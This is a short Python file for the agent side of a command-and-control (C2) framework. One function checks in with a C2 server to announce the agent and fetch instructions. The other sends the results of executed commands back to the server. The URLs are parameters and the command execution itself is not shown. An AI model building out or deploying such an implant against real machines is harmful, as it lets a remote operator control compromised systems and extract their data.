import requests


def perform_checkin(api_url, agent_data):
    """
    Function of the agent responsible for communicating with the C2 server
    to announce its presence and await instructions.
    """

    try:
        response = requests.post(api_url, json=agent_data, timeout=10)

        response.raise_for_status()

        return response.json()

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error in communication with C2: {e}")

        return None


def send_results(results_url, agent_id, task_result):
    """
    Agent function responsible for sending the result of an
    executed command back to the C2 server.
    """
    try:
        result_payload = {"agentId": agent_id, "taskResult": task_result}

        response = requests.post(results_url, json=result_payload, timeout=10)
        
        response.raise_for_status()

        print("[INFO] Task result sent to C2.")
        return True

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error to send result to C2: {e}")
        return False
